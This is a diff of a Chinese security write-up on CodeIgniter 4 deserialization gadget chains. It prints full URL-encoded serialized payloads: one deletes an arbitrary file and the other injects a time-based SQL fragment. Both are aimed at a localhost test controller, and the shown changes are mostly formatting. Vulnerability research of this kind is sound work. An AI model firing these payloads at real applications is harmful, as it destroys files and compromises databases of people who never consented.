@@ -1,10 +1,10 @@
-0x01 背景介绍
+## 0x01 背景介绍
 之前看了一篇文章是将CodeIgniter反序列化调用链的。原文：https://www.freebuf.com/vuls/269597.html。
 文章作者提出了一条反序列化的调用链，大体的意思就是通过反序列化，利用恶意的MYSQL服务器来读取服务器文件的效果。这条利用链要求php7.2的环境，其他都不行。要求不可谓不苛刻。
 或许有小伙伴会问，这调利用链前面不是可以构造SQL语句执行吗？为什么不进行SQL注入呢？答案是，这条利用链里面连接的数据库是自己远程的MYSQL，难道自己注自己吗？
 我的目标是找出新的反序列化利用链？可用性要更好的？
 
-0x02 任意文件删除的反序列化利用链
+## 0x02 任意文件删除的反序列化利用链
 先直接上POC，如果不想看分析的拿着POC就可以走了。
 ```<?php
 
@@ -83,19 +83,22 @@ echo urlencode($a);
 ```
 这就是一个完整的任意文件删除的反序列化利用链了。下面来利用这个触发点。
 1）增加一个控制器的入口函数，里面包含了反序列化的操作。
-
+![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_1.png "CodeIgniter unserialize chain")
 2）放置E:/test/test/111.txt文件，等待删除。这里也可以用相对路径删除CI自己的文件。
-
-
+![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_2.png "CodeIgniter unserialize chain")
 3）运行上面的POC，得到反序列化数据。传递参数。
-http://localhost/codeigniter4/public/index.php/home/testPOST：a=O%3A39%3A%22CodeIgniter%5CCache%5CHandlers%5CRedisHandler%22%3A1%3A%7Bs%3A5%3A%22redis%22%3BO%3A45%3A%22CodeIgniter%5CSession%5CHandlers%5CMemcachedHandler%22%3A2%3A%7Bs%3A9%3A%22memcached%22%3BO%3A38%3A%22CodeIgniter%5CCache%5CHandlers%5CFileHandler%22%3A2%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A13%3A%22E%3A%2Ftest%2Ftest%2F%22%3B%7Ds%3A7%3A%22lockKey%22%3Bs%3A7%3A%22111.txt%22%3B%7D%7D
+```
+http://localhost/codeigniter4/public/index.php/home/test
 
+POST：a=O%3A39%3A%22CodeIgniter%5CCache%5CHandlers%5CRedisHandler%22%3A1%3A%7Bs%3A5%3A%22redis%22%3BO%3A45%3A%22CodeIgniter%5CSession%5CHandlers%5CMemcachedHandler%22%3A2%3A%7Bs%3A9%3A%22memcached%22%3BO%3A38%3A%22CodeIgniter%5CCache%5CHandlers%5CFileHandler%22%3A2%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A13%3A%22E%3A%2Ftest%2Ftest%2F%22%3B%7Ds%3A7%3A%22lockKey%22%3Bs%3A7%3A%22111.txt%22%3B%7D%7D
+```
 
+![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_3.png "CodeIgniter unserialize chain")
 4）运行时会报错，这很正常，因为前面有一步会调用一个quit方法，但是我们后面的类没有这个方法。但是不影响我们任意文件删除操作的执行。
+![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_4.png "CodeIgniter unserialize chain")
 
 
-
-0x03 SQL注入的反序列化利用链
+## 0x03 SQL注入的反序列化利用链
 这条利用链有一些问题，默认情况下CI的类里面不会自动加载配置文件，导致我们不能直接利用这条链来进行SQL注入，仅作学习使用。
 先直接上POC。
 ```<?php
@@ -245,11 +248,14 @@ echo urlencode($a);
 	}
 ```
 为了调试，我们在execute函数的定义位置下调试断点。简单来看也可以这样输出sql.
+![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_5.png "CodeIgniter unserialize chain")
 
 
+```POST: /反序列化的点
 
-POST: /反序列化的点a=O%3A39%3A%22CodeIgniter%5CCache%5CHandlers%5CRedisHandler%22%3A1%3A%7Bs%3A5%3A%22redis%22%3BO%3A44%3A%22CodeIgniter%5CSession%5CHandlers%5CDatabaseHandler%22%3A3%3A%7Bs%3A4%3A%22lock%22%3Bs%3A23%3A%22xxx%27%29+and+sleep%285%29+--+a%22%3Bs%3A8%3A%22platform%22%3Bs%3A5%3A%22mysql%22%3Bs%3A2%3A%22db%22%3BO%3A38%3A%22CodeIgniter%5CDatabase%5CMySQLi%5CConnection%22%3A4%3A%7Bs%3A10%3A%22queryClass%22%3Bs%3A27%3A%22%5CCodeIgniter%5CDatabase%5CQuery%22%3Bs%3A6%3A%22connID%22%3Bs%3A3%3A%22xxx%22%3Bs%3A7%3A%22pretend%22%3Bb%3A0%3Bs%3A7%3A%22swapPre%22%3Ba%3A0%3A%7B%7D%7D%7D%7D
+a=O%3A39%3A%22CodeIgniter%5CCache%5CHandlers%5CRedisHandler%22%3A1%3A%7Bs%3A5%3A%22redis%22%3BO%3A44%3A%22CodeIgniter%5CSession%5CHandlers%5CDatabaseHandler%22%3A3%3A%7Bs%3A4%3A%22lock%22%3Bs%3A23%3A%22xxx%27%29+and+sleep%285%29+--+a%22%3Bs%3A8%3A%22platform%22%3Bs%3A5%3A%22mysql%22%3Bs%3A2%3A%22db%22%3BO%3A38%3A%22CodeIgniter%5CDatabase%5CMySQLi%5CConnection%22%3A4%3A%7Bs%3A10%3A%22queryClass%22%3Bs%3A27%3A%22%5CCodeIgniter%5CDatabase%5CQuery%22%3Bs%3A6%3A%22connID%22%3Bs%3A3%3A%22xxx%22%3Bs%3A7%3A%22pretend%22%3Bb%3A0%3Bs%3A7%3A%22swapPre%22%3Ba%3A0%3A%7B%7D%7D%7D%7D
+```
+![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_6.png "CodeIgniter unserialize chain")
 
-
-
-这里面最大的问题就是$this->connID = "xxx";这个赋值上面，这个connID明显不是一个有效的数据库连接，所以正常的SQL就是执行不了了。如果要利用只能参考作者https://www.freebuf.com/vuls/269597.html的利用方式。
+这里面最大的问题就是$this->connID = "xxx";这个赋值上面，这个connID明显不是一个有效的数据库连接，所以正常的SQL就是执行不了了。如果要利用只能参考作者https://www.freebuf.com/vuls/269597.html
+的利用方式。
